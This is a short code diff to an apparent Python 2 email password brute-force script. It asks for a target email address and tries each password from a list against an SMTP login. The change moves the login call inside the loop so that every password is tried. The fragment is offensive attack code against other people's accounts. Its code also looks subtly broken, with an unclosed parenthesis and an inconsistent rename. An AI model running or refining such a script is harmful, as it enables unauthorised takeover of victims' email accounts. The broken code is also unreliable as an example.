@@ -26,11 +26,11 @@ pass_list = pass_file.readlines()
 def login():
     i = 0
     user_name = raw_input('enter the target email:')
-    server.ehlo()
+    Server.ehlo()
     for password in pass_list:
         i = i + 1
         print( str(i) + '/' +str(len(pass_list))
-    server.login(user_name,password)
+        Server.login(user_name,password)
         system ('clear')
         
 
